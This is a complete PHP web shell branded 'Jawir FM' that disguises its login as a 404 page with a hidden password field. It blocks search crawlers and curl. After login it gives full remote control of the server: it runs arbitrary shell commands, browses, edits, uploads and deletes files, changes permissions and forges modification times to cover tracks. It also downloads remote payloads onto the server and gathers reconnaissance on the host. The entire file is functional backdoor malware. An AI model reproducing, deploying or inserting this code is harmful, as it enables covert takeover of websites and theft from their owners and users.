<?php
session_start();
define('APP_VER', '0.6');
$password = defined('PW') ? PW : '5c5fa09440696b310b4b1750d49f84ca';

// Undetect bots
if (!empty($_SERVER['HTTP_USER_AGENT'])) {
    $bots = ['Googlebot', 'Slurp', 'MSNBot', 'PycURL', 'facebookexternalhit', 'ia_archiver', 'crawler', 'Yandex', 'Rambler', 'Yahoo! Slurp', 'YahooSeeker', 'bingbot', 'curl'];
    if (preg_match('/' . implode('|', $bots) . '/i', $_SERVER['HTTP_USER_AGENT'])) {
        header('HTTP/1.0 404 Not Found');
        exit;
    }
}

// Handle login actions
if (!isset($_SESSION['logged_in'])) {
    if ($_SERVER['REQUEST_METHOD']=='POST' && isset($_POST['password']) && md5($_POST['password'])==$password) {
        $_SESSION['logged_in'] = true; header('Location:'); exit;
    }
    echo '<!DOCTYPE html><html><head><meta charset="UTF-8"><title>404 Not Found</title><style>html,body{margin:0;padding:0;height:100%;overflow:hidden}iframe{position:absolute;top:0;left:0;width:100vw;height:100vh;border:none}#form{position:absolute;z-index:9999}#form input{opacity:0;pointer-events:none;position:absolute;cursor:default;transition:0.3s}#form input.revealed{opacity:1;pointer-events:auto;cursor:pointer}#form button{display:none}.clue-dot{position:fixed;bottom:20px;right:20px;width:6px;height:6px;background:rgba(0,0,0,0.1);border-radius:50%;opacity:0.5;cursor:pointer}</style></head><body><iframe src="/404"></iframe><form id="form" method="post"><input type="password" name="password" id="input" autocomplete="off"><button type="submit">Login</button></form><div class="clue-dot" title="404"></div><script>const f=document.getElementById("form"),i=document.getElementById("input"),d=document.querySelector(".clue-dot"),x=Math.random()*(window.innerWidth-100),y=Math.random()*(window.innerHeight-30);f.style.left=`${x}px`;f.style.top=`${y}px`;d.onclick=()=>{i.classList.add("revealed");i.focus()};</script></body></html>'; exit;
}

// Path
$action = isset($_GET['action']) ? $_GET['action'] : 'filemanager';
$path = isset($_GET['path']) ? realpath($_GET['path']) : getcwd();
if (!$path || !is_dir($path)) $path = getcwd();
$parent = dirname($path);

// Handle sort preference
if(isset($_GET['sort'])) $_SESSION['sort']=$_GET['sort'];
if(isset($_GET['order'])) $_SESSION['order']=$_GET['order'];
$sort = isset($_SESSION['sort']) ? $_SESSION['sort'] : 'name';
$order = isset($_SESSION['order']) ? $_SESSION['order'] : 'asc';

// Handle search
$search = isset($_GET['search']) ? $_GET['search'] : '';

// Handle POST actions
if ($_SERVER['REQUEST_METHOD'] == 'POST') {
    try {
        $self = basename(__FILE__);
        if($action=='command' && isset($_POST['cmd'])){
            $cmd_path = isset($_POST['path']) ? $_POST['path'] : getcwd();
            if (is_dir($cmd_path)) { chdir($cmd_path); }
            if(function_exists('shell_exec')){$output = shell_exec($_POST['cmd'].' 2>&1');}elseif (function_exists('proc_open')) {
            $d = [0=>['pipe','r'],1=>['pipe','w'],2=>['pipe','w']]; $p = proc_open($_POST['cmd'],$d,$pipes);
            if (is_resource($p)) {
                fclose($pipes[0]);
                $output = stream_get_contents($pipes[1]).stream_get_contents($pipes[2]);
                fclose($pipes[1]); fclose($pipes[2]); proc_close($p);
            }else{$output="proc_open failed!";}}else{$output="Server function disabled!";}
            echo '<pre class="bg-black text-green-400 p-2 rounded">'.$output.'</pre>';
            exit;
        }
        elseif (isset($_POST['get_content'])) {
            $f = basename($_POST['get_content']);
            if ($f == $self) {
                echo 'Author @willygoid';
            } else {
                $file = $path.'/'.$f;
                if (is_file($file)) {
                    echo file_get_contents($file);
                } else {
                    echo '';
                }
            }
            exit;
        }
        elseif (isset($_POST['new_folder'])){
            mkdir($path.'/'.basename($_POST['new_folder']));
            $_SESSION['msg']='Folder created'; $_SESSION['msg_type']='success';
        }
        elseif (isset($_POST['new_file'])){
            $new = basename($_POST['new_file']);
            if($new==$self){
                $_SESSION['msg']='Cannot overwrite file manager itself'; $_SESSION['msg_type']='error';
            } else {
                file_put_contents($path.'/'.$new, '');
                $_SESSION['msg']='File created'; $_SESSION['msg_type']='success';
            }
        }
        elseif (isset($_POST['delete'])){
            $t=basename($_POST['delete']);
            if($t==$self){
                $_SESSION['msg']='Cannot delete file manager itself'; $_SESSION['msg_type']='error';
            } else {
                $target=$path.'/'.$t;
                if(is_dir($target)?rmdir($target):unlink($target)){
                    $_SESSION['msg']='Deleted successfully'; $_SESSION['msg_type']='success';
                } else{ $_SESSION['msg']='Delete failed'; $_SESSION['msg_type']='error'; }
            }
        }
        elseif (isset($_POST['rename_from'],$_POST['rename_to'])){
            if(rename($path.'/'.basename($_POST['rename_from']),$path.'/'.basename($_POST['rename_to']))){
                $_SESSION['msg']='Renamed successfully'; $_SESSION['msg_type']='success';
            } else{ $_SESSION['msg']='Rename failed'; $_SESSION['msg_type']='error'; }
        }
        elseif (isset($_POST['edit_file'],$_POST['content'])){
            $edit = basename($_POST['edit_file']);
            if($edit==$self){
                $_SESSION['msg']='Cannot edit file manager itself'; $_SESSION['msg_type']='error';
            } else {
                if(file_put_contents($path.'/'.$edit,$_POST['content'])!==false){
                    $_SESSION['msg']='Saved successfully'; $_SESSION['msg_type']='success';
                } else{ $_SESSION['msg']='Save failed'; $_SESSION['msg_type']='error'; }
            }
        }
        elseif (isset($_FILES['files'])){
            $ok=0;
            foreach($_FILES['files']['tmp_name'] as $i=>$tmp)
                if(move_uploaded_file($tmp,$path.'/'.basename($_FILES['files']['name'][$i]))) $ok++;
            $_SESSION['msg']= $ok.' file(s) uploaded'; $_SESSION['msg_type']='success';
        }
        elseif (isset($_POST['update_perm']) && isset($_POST['perm_value'])) {
            $file=$path.'/'.basename($_POST['update_perm']);
            if(@chmod($file, octdec($_POST['perm_value']))){
                $_SESSION['msg']='Permission updated'; $_SESSION['msg_type']='success';
            } else{ $_SESSION['msg']='Update permission failed'; $_SESSION['msg_type']='error'; }
        }
        elseif (isset($_POST['update_mtime'],$_POST['mtime_value'])){
            $file=$path.'/'.basename($_POST['update_mtime']);
            if(@touch($file, strtotime($_POST['mtime_value']))){
                $_SESSION['msg']='Modified time updated'; $_SESSION['msg_type']='success';
            } else{ $_SESSION['msg']='Update failed'; $_SESSION['msg_type']='error'; }
        }
        elseif (isset($_POST['download_url'],$_POST['output_name'],$_POST['method'])){
            $url=trim($_POST['download_url']); $out=$path.'/'.basename($_POST['output_name']); $method=$_POST['method'];
            $ok=false;
            switch($method){
                case 'file_get_contents': $d=@file_get_contents($url); if($d!==false)$ok=file_put_contents($out,$d)!==false; break;
                case 'copy': $ok=@copy($url,$out); break;
                case 'fopen': $in=@fopen($url,'rb'); $outf=@fopen($out,'wb'); if($in&&$outf){while(!feof($in))fwrite($outf,fread($in,8192)); fclose($in); fclose($outf); $ok=true;} break;
                case 'stream_context': $ctx=stream_context_create(); $d=@file_get_contents($url,false,$ctx); if($d!==false)$ok=file_put_contents($out,$d)!==false; break;
                case 'curl': $ch=curl_init($url); curl_setopt($ch,CURLOPT_RETURNTRANSFER,true); $d=curl_exec($ch); curl_close($ch); if($d!==false)$ok=file_put_contents($out,$d)!==false; break;
            }
            $_SESSION['msg']= $ok?'Download success':'Download failed'; $_SESSION['msg_type']=$ok?'success':'error';
        }
    } catch(Exception $e){ $_SESSION['msg']='Error: '.$e->getMessage(); $_SESSION['msg_type']='error'; }
    header('Location: '.$_SERVER['REQUEST_URI']); exit;
}

// Scan dir
$files=scandir($path);
$folders=[];$regular_files=[];
foreach($files as $f){
    if($f=='.'||$f=='..')continue;
    $fp=$path.'/'.$f;
    $stat = stat($fp);
    if($search && stripos($f,$search)===false) continue;
    $u = posix_getpwuid($stat['uid']); $owner = $u ? $u['name'] : '?';
    $g = posix_getgrgid($stat['gid']); $group = $g ? $g['name'] : '?';
    $perm= substr(sprintf('%o', $stat['mode']), -3);
    $item=['name'=>$f,'mtime'=>$stat['mtime'],'owner'=>$owner.':'.$group,'perm'=>$perm];
    if(is_dir($fp)){ $folders[]=$item; }else{ $item['size'] = getSize($stat['size']); $regular_files[]=$item;}
}

//Calculate file size
function getSize($s) {
    for ($i = 0; $s >= 1024 && $i < 4; $i++) $s /= 1024;
    return round($s, 2) . ['B','KB','MB','GB','TB'][$i];
}

// Sort
$sort_func = function($a, $b) use ($sort, $order) {
    if ($sort == 'mtime') {
        if ($order == 'asc') {
            return ($a['mtime'] == $b['mtime']) ? 0 : (($a['mtime'] < $b['mtime']) ? -1 : 1);
        } else {
            return ($a['mtime'] == $b['mtime']) ? 0 : (($a['mtime'] > $b['mtime']) ? -1 : 1);
        }
    } else {
        return ($order == 'asc') ? strcasecmp($a['name'], $b['name']) : strcasecmp($b['name'], $a['name']);
    }
};
usort($folders,$sort_func); usort($regular_files,$sort_func);

// URL builder
function toggle_order($c){return $c=='asc'?'desc':'asc';}
function sort_url($by,$cs,$co,$p,$s){$o=($by==$cs)?toggle_order($co):'asc'; return "?path=".urlencode($p)."&sort=$by&order=$o&search=".urlencode($s);}

//Breadcrumbs
$parts = explode(DIRECTORY_SEPARATOR, trim($path, DIRECTORY_SEPARATOR));
$breadcrumbs = [];
$build = DIRECTORY_SEPARATOR;
foreach ($parts as $part) {
    if ($part === '') continue;
    $build .= $part . DIRECTORY_SEPARATOR;
    $breadcrumbs[] = ['name'=>$part, 'path'=>$build];
}

// Goto Dir
$self_dir = dirname(realpath(__FILE__));
$docroot = realpath($_SERVER['DOCUMENT_ROOT']);

//Count Domain
function countDomains($f='/etc/named.conf'){
    if(strtoupper(substr(PHP_OS,0,3))==='WIN') return '-';
    if(!is_readable($f)) return "-";
    $c=0;
    foreach(file($f, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES) as $l)
        if(strpos($l,'zone')!==false && preg_match('#zone "(.*)"#',$l,$m) && strlen(trim($m[1]))>2) $c++;
    return "$c Domain";
}

//Downloader
function downloader($url, $dest = null) {
    if (function_exists('curl_init')) {
        $ch = curl_init($url);
        curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 5);
        curl_setopt($ch, CURLOPT_TIMEOUT, 10);
        if ($dest === null) {
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
            $data = curl_exec($ch);
            curl_close($ch);
            return $data !== false ? $data : false;
        }
        $fp = fopen($dest, 'w');
        if (!$fp) return false;
        curl_setopt($ch, CURLOPT_FILE, $fp);
        $res = curl_exec($ch);
        curl_close($ch);
        fclose($fp);
        return $res !== false;
    }
    if ($dest !== null && ini_get('allow_url_fopen')) {
        return @copy($url, $dest);
    }
    return ini_get('allow_url_fopen') ? @file_get_contents($url) : false;
}

//Get Ip Public Info
function getPublicIP(){return ($ip=downloader('https://api.ipify.org'))?$ip:gethostbyname(gethostname());}

//Server info
function getServerInfo(){
    return [
        'Server IP' => getPublicIP(),
        'OS' => php_uname(),
        'PHP Version' => PHP_VERSION,
        'Server Software' => isset($_SERVER['SERVER_SOFTWARE']) ? $_SERVER['SERVER_SOFTWARE'] : 'CLI',
        'Disabled Functions' => ($d = ini_get('disable_functions')) ? $d : '-',
        'Loaded Extensions' => implode(', ', get_loaded_extensions()),
        'My IP' => isset($_SERVER['REMOTE_ADDR']) ? $_SERVER['REMOTE_ADDR'] : '-',
        'User:Group' => get_current_user() . ':' . (function_exists('posix_getgrgid') && function_exists('posix_geteuid') ? posix_getgrgid(posix_geteuid())['name'] : '?'),
        'Domains' => countDomains()
    ];
}
?>
<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>File Manager Pro</title>
<meta name="viewport" content="width=device-width, initial-scale=1.0" />
<script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
<link href="https://cdn.jsdelivr.net/npm/tailwindcss@2.2.19/dist/tailwind.min.css" rel="stylesheet">
<style>
body.dark table { background-color: #1f2937; color: #f3f4f6; }
body.dark table tr { border-color: #374151; }
body.dark .bg-gray-200 { background-color: #374151 !important; }
body.dark .bg-white { background-color: #1f2937 !important; color: #f3f4f6; }
body.dark input, body.dark textarea, body.dark select {background-color: #374151 !important; color: #f3f4f6;}
body.dark .border { border-color: #4b5563 !important; }
body.dark .text-gray-700 { color: #d1d5db !important; }
body.dark .text-gray-500 { color: #9ca3af !important; }
body.dark .bg-gray-50 { background-color: #374151 !important; }
body.dark .bg-gray-300 {background-color: #4b5563 !important; color: #f9fafb !important;}
body.dark .bg-gray-200 {background-color: #4b5563 !important; color: #f9fafb !important;}
</style>
<script>
$(function(){
    $('.edit-btn').click(function(){ let f=$(this).data('file'); $('.edit-filename').text(f); $.post('',{get_content:f},d=>{$('#editModal textarea').val(d);$('#editModal input[name="edit_file"]').val(f);$('#editModal').removeClass('hidden');});});
    $('.delete-btn').click(function(){ $('#deleteModal input[name="delete"]').val($(this).data('file')); $('#deleteModal span').text($(this).data('file')); $('#deleteModal').removeClass('hidden');});
    $('.rename-btn').click(function(){ $('#renameModal input[name="rename_from"]').val($(this).data('file')); $('#renameModal input[name="rename_to"]').val($(this).data('file')); $('#renameModal').removeClass('hidden');});
    $('.perm-btn').click(function(){ let f=$(this).data('file'); let p=$(this).data('perm'); $('#permModal input[name="update_perm"]').val(f); $('#permModal input[name="perm_value"]').val(p); $('#permModal span').text(f); $('#permModal').removeClass('hidden'); });
    $('.mtime-btn').click(function(){ let f=$(this).data('file'); let dt=$(this).data('mtime'); $('#mtimeModal input[name="update_mtime"]').val(f); $('#mtimeModal input[name="mtime_value"]').val(dt); $('#mtimeModal span').text(f); $('#mtimeModal').removeClass('hidden');});
    $('#showNewFile').click(()=>$('#newFileModal').removeClass('hidden'));
    $('#showNewFolder').click(()=>$('#newFolderModal').removeClass('hidden'));
    $('#showDownloader').click(()=>$('#downloaderModal').removeClass('hidden'));
    $('#uploadBtn').click(()=>$('#uploadInput').click());
    $('.close').click(()=>$('.modal').addClass('hidden'));
    $('#uploadInput').change(()=>$('#uploadForm').submit());
});
</script>
<script>
$(function(){
    $('.menu-btn').click(function(){
        let act=$(this).data('action');
        $('.menu-btn').removeClass('bg-blue-500 text-white').addClass('bg-gray-200 text-gray-800');
        $(this).addClass('bg-blue-500 text-white');
        $('#content').html('<div class="text-center p-4">Loading...</div>');
        let path = encodeURIComponent('<?=$path?>');
        $.get('?action='+act+'&path='+path,function(d){ $('#content').html(d); });
    });
    $('.menu-btn[data-action="<?=$action?>"]').addClass('bg-blue-500 text-white').removeClass('bg-gray-200 text-gray-800');
});
</script>
<link href="https://cdnjs.cloudflare.com/ajax/libs/toastr.js/latest/toastr.min.css" rel="stylesheet">
<script src="https://cdnjs.cloudflare.com/ajax/libs/toastr.js/latest/toastr.min.js"></script>
</head>
<body id="content" class="bg-gray-100">
<header class="container mx-auto flex items-center justify-between p-4">
    <a href="?path=<?=urlencode($self_dir)?>" class="flex items-center">
        <h1 class="text-xl sm:text-2xl lg:text-3xl font-bold">Jawir FM</h1>
    </a>
    <a href="?path=<?=urlencode($docroot)?>" class="flex items-center">
        <img alt="Logo App" class="h-8 md:h-12" src="//sga-cdn-hxg6b2d7ctb2c0eu.z02.azurefd.net/agent-websites/319/medialibrary/images/319_756a1e4ed5294e85a8c61f1031637228.webp"/>
    </a>
</header>
<div class="container mx-auto flex space-x-2 mb-4">
    <button data-action="filemanager" class="menu-btn bg-gray-200 text-gray-800 px-3 py-1 rounded">📁 File Manager</button>
    <button data-action="serverinfo" class="menu-btn bg-gray-200 text-gray-800 px-3 py-1 rounded">💻 Server Info</button>
    <button data-action="command" class="menu-btn bg-gray-200 text-gray-800 px-3 py-1 rounded">💡 Command</button>
</div>
<main role="main" class="container mx-auto mb-4">
<nav class="flex px-5 py-3 text-gray-700 border border-gray-200 rounded-lg bg-gray-50" aria-label="Breadcrumb">
  <ol class="inline-flex items-center space-x-1 md:space-x-2 rtl:space-x-reverse">
    <li class="inline-flex items-center">
      <a href="?path=/" class="inline-flex items-center text-sm font-medium text-gray-700 hover:text-blue-600">
        <svg xmlns="http://www.w3.org/2000/svg" class="w-3 h-3 me-2.5" aria-hidden="true" fill="currentColor" viewBox="0 0 20 20">
          <path d="m19.707 9.293-2-2-7-7a1 1 0 0 0-1.414 0l-7 7-2 2a1 1 0 0 0 1.414 1.414L2 10.414V18a2 2 0 0 0 2 2h3a1 1 0 0 0 1-1v-4a1 1 0 0 1 1-1h2a1 1 0 0 1 1 1v4a1 1 0 0 0 1 1h3a2 2 0 0 0 2-2v-7.586l.293.293a1 1 0 0 0 1.414-1.414Z"/>
        </svg>
      </a>
    </li>
    <?php foreach($breadcrumbs as $i => $crumb): ?>
    <li class="inline-flex items-center">
      <svg xmlns="http://www.w3.org/2000/svg" class="rtl:rotate-180 block w-3 h-3 mx-1 text-gray-400 " aria-hidden="true" fill="none" viewBox="0 0 6 10">
        <path stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="m1 9 4-4-4-4"/>
      </svg>
      <?php if($i < count($breadcrumbs)-1): ?>
      <a href="?path=<?=urlencode(rtrim($crumb['path'],'/'))?>" class="inline-flex items-center text-sm font-medium text-gray-700 hover:text-blue-600">
        <?=htmlspecialchars($crumb['name'])?>
      </a>
      <?php else: ?>
      <span class="ms-1 text-sm font-medium <?=is_writable($crumb['path'])?'text-green-500':'text-red-500'?> md:ms-2"><?=htmlspecialchars($crumb['name'])?></span>
      <?php endif;?>
    </li>
    <?php endforeach; ?>
  </ol>
</nav>
</main>
<?php
if($action=='serverinfo'):
    $info=getServerInfo(); ?>
    <div class="container mx-auto p-4 bg-white rounded-lg shadow">
    <h2 class="text-xl font-bold mb-2">💻 Server Info</h2>
    <ul class="list-disc pl-5">
    <?php foreach($info as $k=>$v): ?>
    <li><span class="font-semibold"><?=htmlspecialchars($k)?>:</span> <span class="text-gray-700"><?=htmlspecialchars($v)?></span></li>
    <?php endforeach; ?>
    </ul>
    </div>

<?php elseif($action=='command'): ?>
    <div class="container mx-auto p-4 bg-white rounded-lg shadow">
    <h2 class="text-xl font-bold mb-2">💡 Execute Command</h2>
    <form method="post" onsubmit="$.post('?action=command',$ (this).serialize(),function(d){$('#output').html(d);});return false;">
    <input name="cmd" class="border w-full px-2 py-1 mb-2" placeholder="Enter command...">
    <input type="hidden" name="path" value="<?=htmlspecialchars($path)?>">
    <button class="bg-green-500 text-white px-3 py-1 rounded">Run</button>
    </form>
    <div id="output" class="mt-2 text-sm"></div>
    </div>

<?php else: ?>

<div class="container mx-auto p-4 bg-white rounded-lg shadow">
    <div class="flex justify-between mb-4">
    <div class="flex space-x-2">
    <a href="?path=<?=urlencode($docroot)?>" class="bg-gray-300 px-2 py-1 rounded">🏠 Root</a>
    <a href="?path=<?=urlencode($self_dir)?>" class="bg-gray-300 px-2 py-1 rounded">📂 FM Dir</a>
    </div>    
    <div class="flex space-x-2">
    <form method="get" class="flex space-x-1 mb-2 md:mb-0"><input type="hidden" name="path" value="<?=htmlspecialchars($path)?>"><input type="text" name="search" value="<?=htmlspecialchars($search)?>" placeholder="Search..." class="border px-2 py-1 rounded w-32"><button class="bg-gray-300 px-2 rounded">🔍</button></form>
    <button id="showDownloader" class="bg-gray-300 px-2 py-1 rounded flex items-center space-x-1">
        <svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="1.5" stroke="currentColor" class="h-5 w-5 text-gray-700">
            <path stroke-linecap="round" stroke-linejoin="round" d="M19.5 14.25v-2.625a3.375 3.375 0 0 0-3.375-3.375h-1.5A1.125 1.125 0 0 1 13.5 7.125v-1.5a3.375 3.375 0 0 0-3.375-3.375H8.25m.75 12 3 3m0 0 3-3m-3 3v-6m-1.5-9H5.625c-.621 0-1.125.504-1.125 1.125v17.25c0 .621.504 1.125 1.125 1.125h12.75c.621 0 1.125-.504 1.125-1.125V11.25a9 9 0 0 0-9-9Z" />
        </svg>
        <span>Down</span>
    </button>
    <button id="showNewFolder" class="bg-gray-300 px-2 py-1 rounded flex items-center space-x-1">
        <svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="1.5" stroke="currentColor" class="h-5 w-5 text-gray-700">
            <path stroke-linecap="round" stroke-linejoin="round" d="M12 10.5v6m3-3H9m4.06-7.19-2.12-2.12a1.5 1.5 0 0 0-1.061-.44H4.5A2.25 2.25 0 0 0 2.25 6v12a2.25 2.25 0 0 0 2.25 2.25h15A2.25 2.25 0 0 0 21.75 18V9a2.25 2.25 0 0 0-2.25-2.25h-5.379a1.5 1.5 0 0 1-1.06-.44Z" />
        </svg>
        <span>ND</span>
    </button>
    <button id="showNewFile" class="bg-gray-300 px-2 py-1 rounded flex items-center space-x-1">
        <svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="1.5" stroke="currentColor" class="h-5 w-5 text-gray-700">
            <path stroke-linecap="round" stroke-linejoin="round" d="M19.5 14.25v-2.625a3.375 3.375 0 0 0-3.375-3.375h-1.5A1.125 1.125 0 0 1 13.5 7.125v-1.5a3.375 3.375 0 0 0-3.375-3.375H8.25m3.75 9v6m3-3H9m1.5-12H5.625c-.621 0-1.125.504-1.125 1.125v17.25c0 .621.504 1.125 1.125 1.125h12.75c.621 0 1.125-.504 1.125-1.125V11.25a9 9 0 0 0-9-9Z" />
        </svg>
        <span>NF</span>
    </button>
    <form method="post" enctype="multipart/form-data" id="uploadForm" class="inline">
    <input type="file" name="files[]" multiple id="uploadInput" class="hidden">
    <button type="button" id="uploadBtn" class="bg-gray-300 px-2 py-1 rounded flex items-center space-x-1">
        <svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="1.5" stroke="currentColor" class="h-5 w-5 text-gray-700">
            <path stroke-linecap="round" stroke-linejoin="round" d="M12 16.5V9.75m0 0 3 3m-3-3-3 3M6.75 19.5a4.5 4.5 0 0 1-1.41-8.775 5.25 5.25 0 0 1 10.233-2.33 3 3 0 0 1 3.758 3.848A3.752 3.752 0 0 1 18 19.5H6.75Z" />
        </svg>
        <span>Upload</span>
    </button>
    </form>
    </div></div>

    <table class="min-w-full bg-white border">
    <tr class="bg-gray-200">
    <th class="p-2 text-left"><a href="<?=sort_url('name',$sort,$order,$path,$search)?>" class="hover:underline">Name<?=($sort=='name'?($order=='asc'?' 🔼':' 🔽'):'')?></a></th>
    <th class="p-2">Owner</th>
    <th class="p-2">Size</th>
    <th class="p-2">Perm</th>
    <th class="p-2"><a href="<?=sort_url('mtime',$sort,$order,$path,$search)?>" class="hover:underline">Last Modified<?=($sort=='mtime'?($order=='asc'?' 🔼':' 🔽'):'')?></a></th>
    <th class="p-2">Action</th></tr>
    <?php if($path != $parent): ?><tr class="border-t hover:bg-yellow-200 dark:hover:bg-gray-700" title="Goto Parent Dir"><td class="p-2"><a href="?path=<?=urlencode($parent)?>" class="text-blue-500">📁 ..</a></td><td class="p-2">-</td><td class="p-2">-</td><td class="p-2">-</td><td class="p-2">-</td><td class="p-2"></td></tr><?php endif; ?>
    <?php foreach(array_merge($folders,$regular_files) as $f):$fp=$path.'/'.$f['name'];$mtime=date('Y-m-d\TH:i',$f['mtime']); ?>
    <tr class="border-t hover:bg-yellow-200 hover:text-gray-900" title="<?=htmlspecialchars($f['name'])?>">
    <td class="p-2"><?php if(is_dir($fp)):?><a href="?path=<?=urlencode($fp)?>" class="text-blue-500">📁 <?=htmlspecialchars($f['name'])?></a><?php else:?>📄 <?=htmlspecialchars($f['name'])?><?php endif;?></td>
    <td class="p-2"><?=htmlspecialchars($f['owner'])?></td>
    <td class="p-2"><?=htmlspecialchars($f['size'])?></td>
    <td class="p-2"><button data-file="<?=htmlspecialchars($f['name'])?>" data-perm="<?=htmlspecialchars($f['perm'])?>" class="perm-btn underline px-2 py-1 rounded <?=is_writable($fp)?'bg-green-200 text-green-800':'bg-gray-200 text-base'?>"><?=$f['perm']?></button></td>
    <td class="p-2"><button data-file="<?=htmlspecialchars($f['name'])?>" data-mtime="<?=$mtime?>" class="mtime-btn underline text-blue-500"><?=date('Y-m-d H:i',$f['mtime'])?></button></td>
    <td class="p-2 space-x-1"><?php if(!is_dir($fp)):?><button data-file="<?=htmlspecialchars($f['name'])?>" class="edit-btn bg-gray-300 px-2 rounded" title="Edit">📝</button><?php endif;?><button data-file="<?=htmlspecialchars($f['name'])?>" class="rename-btn bg-gray-300 px-2 rounded" title="Rename">✍🏼</button><button data-file="<?=htmlspecialchars($f['name'])?>" class="delete-btn bg-gray-300 px-2 rounded" title="Delete">🗑️</button></td></tr><?php endforeach;?>
    </table>
</div>

<!-- Modals -->
<div id="editModal" class="modal fixed inset-0 bg-gray-800 bg-opacity-75 hidden flex items-center justify-center">
<div class="bg-white p-4 w-1/2 rounded">
<h2 class="text-xl mb-2">✏️ Edit: <span class="edit-filename text-blue-600"></span></h2>
<form method="post"><input type="hidden" name="edit_file">
<textarea name="content" class="w-full h-96 border mb-2 font-mono"></textarea>
<div class="flex justify-between"><button class="bg-green-500 text-white px-4 py-1 rounded">💾 Save</button><button type="button" class="close bg-gray-300 px-4 py-1 rounded">❌ Close</button></div>
</form></div></div>

<div id="deleteModal" class="modal fixed inset-0 bg-gray-800 bg-opacity-75 hidden flex items-center justify-center">
<div class="bg-white p-4 rounded">
<form method="post"><p>Delete <span class="font-bold"></span> ?</p><input type="hidden" name="delete">
<div class="flex justify-between mt-2"><button class="bg-red-500 text-white px-4 py-1 rounded">🗑️ Delete</button><button type="button" class="close bg-gray-300 px-4 py-1 rounded">❌ Cancel</button></div></form></div></div>

<div id="renameModal" class="modal fixed inset-0 bg-gray-800 bg-opacity-75 hidden flex items-center justify-center">
<div class="bg-white p-4 rounded"><form method="post"><input type="hidden" name="rename_from">
<p>New name:</p><input name="rename_to" class="border px-2 mb-2">
<div class="flex justify-between"><button class="bg-green-500 text-white px-4 py-1 rounded">↩️ Rename</button><button type="button" class="close bg-gray-300 px-4 py-1 rounded">❌ Cancel</button></div></form></div></div>

<div id="newFileModal" class="modal fixed inset-0 bg-gray-800 bg-opacity-75 hidden flex items-center justify-center">
<div class="bg-white p-4 rounded"><form method="post"><p>File name:</p><input name="new_file" class="border px-2 mb-2">
<div class="flex justify-between"><button class="bg-green-500 text-white px-4 py-1 rounded">📄 Create</button><button type="button" class="close bg-gray-300 px-4 py-1 rounded">❌ Cancel</button></div></form></div></div>

<div id="newFolderModal" class="modal fixed inset-0 bg-gray-800 bg-opacity-75 hidden flex items-center justify-center">
<div class="bg-white p-4 rounded"><form method="post"><p>Folder name:</p><input name="new_folder" class="border px-2 mb-2">
<div class="flex justify-between"><button class="bg-green-500 text-white px-4 py-1 rounded">📁 Create</button><button type="button" class="close bg-gray-300 px-4 py-1 rounded">❌ Cancel</button></div></form></div></div>

<div id="mtimeModal" class="modal fixed inset-0 bg-gray-800 bg-opacity-75 hidden flex items-center justify-center">
<div class="bg-white p-4 rounded"><form method="post"><input type="hidden" name="update_mtime">
<p>Edit Last Modified of <span class="font-bold"></span>:</p>
<input type="datetime-local" name="mtime_value" class="border px-2 mb-2">
<div class="flex justify-between"><button class="bg-green-500 text-white px-4 py-1 rounded">⏰ Update</button><button type="button" class="close bg-gray-300 px-4 py-1 rounded">❌ Cancel</button></div></form></div></div>

<div id="downloaderModal" class="modal fixed inset-0 bg-gray-800 bg-opacity-75 hidden flex items-center justify-center">
<div class="bg-white p-4 rounded"><form method="post"><p>URL Source:</p><input name="download_url" class="border px-2 mb-2 w-full"><p>Output Name:</p><input name="output_name" class="border px-2 mb-2 w-full"><p>Method:</p><select name="method" class="border px-2 mb-2 w-full"><option>file_get_contents</option><option>cURL</option><option>fopen</option><option>copy</option><option>stream_context</option></select>
<div class="flex justify-between"><button class="bg-purple-500 text-white px-4 py-1 rounded">⬇️ Download</button><button type="button" class="close bg-gray-300 px-4 py-1 rounded">❌ Cancel</button></div></form></div></div>

<div id="permModal" class="modal fixed inset-0 bg-gray-800 bg-opacity-75 hidden flex items-center justify-center">
<div class="bg-white p-4 rounded"><form method="post"><input type="hidden" name="update_perm">
<p>Edit Permission of <span class="font-bold"></span>:</p>
<input name="perm_value" class="border px-2 mb-2" placeholder="e.g. 755">
<div class="flex justify-between"><button class="bg-green-500 text-white px-4 py-1 rounded">🔧 Update</button><button type="button" class="close bg-gray-300 px-4 py-1 rounded">❌ Cancel</button></div></form></div></div>

<?php if(isset($_SESSION['msg'])): ?>
<script>
toastr.options = { "closeButton": true, "progressBar": true, "positionClass":"toast-top-right"};
toastr.<?= $_SESSION['msg_type']=='error'?'error':'success' ?>("<?= addslashes($_SESSION['msg']) ?>");
</script>
<?php unset($_SESSION['msg'],$_SESSION['msg_type']); endif; ?>

<?php endif;?>

<footer class="container mx-auto p-4">
      <div class="flex flex-col sm:flex-row justify-between items-center pt-4 border-t border-gray-300">
        <div class="flex-grow lg:w-1/2 text-gray-600">
              <p class="text-gray-700"></p>Copyleft <?=date('Y');?> @willygoid</p>
        </div>
        <div class="flex-grow lg:w-1/2 text-gray-600 text-right">
          <p class="font-bold"> <button type="button" id="toggleTheme" class="bg-gray-800 text-white px-2 py-1 rounded">🌙 Dark</button> v<?=APP_VER;?></p>
        </div>
      </div>
</footer>
<script>
$(function(){
  $('#toggleTheme').click(function(){
    $('body').toggleClass('dark bg-gray-900 text-gray-100');
    // Toggle tombol text
    if($('body').hasClass('dark')){
      $(this).text('☀️ Light').removeClass('bg-gray-800').addClass('bg-yellow-500');
    } else {
      $(this).text('🌙 Dark').removeClass('bg-yellow-500').addClass('bg-gray-800');
    }
    // Simpan preferensi ke localStorage
    if($('body').hasClass('dark')) localStorage.setItem('theme','dark');
    else localStorage.setItem('theme','light');
  });

  // Cek preferensi theme saat load
  if(localStorage.getItem('theme')==='dark'){
    $('body').addClass('dark bg-gray-900 text-gray-100');
    $('#toggleTheme').text('☀️ Light').removeClass('bg-gray-800').addClass('bg-yellow-500');
  }
});
</script>
</body></html>
